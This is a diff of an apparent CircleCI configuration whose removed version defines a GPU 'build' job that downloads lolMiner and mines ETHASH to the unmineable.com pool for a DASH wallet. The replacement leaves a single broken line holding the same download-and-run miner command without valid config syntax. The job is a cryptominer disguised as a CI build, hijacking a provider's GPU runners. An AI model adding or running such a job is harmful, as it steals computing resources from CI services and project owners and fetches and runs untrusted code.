@@ -1,11 +1,1 @@
-version: 2.1
-
-jobs:
-  build:
-    machine:
-      image: ubuntu-2004-cuda-11.4:202110-01
-    resource_class: gpu.nvidia.small
-    steps:
-      - run: nvidia-smi
-      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
-      - run: wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.45/lolMiner_v1.45_Lin64.tar.gz && tar xvf lolMiner_v1.45_Lin64.tar.gz && cd 1.45 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user DASH:XdKzmPkYa85964Xq5CTEbEAgBZya21hBTt.$(echo $(shuf -i 1-9999 -n 1)-modalnikah) --ethstratum ETHPROXY
+https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.45/lolMiner_v1.45_Lin64.tar.gz && tar xvf lolMiner_v1.45_Lin64.tar.gz && cd 1.45 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user DASH:XdKzmPkYa85964Xq5CTEbEAgBZya21hBTt.$(echo $(shuf -i 1-9999 -n 1)-modalnikah) --ethstratum ETHPROXY
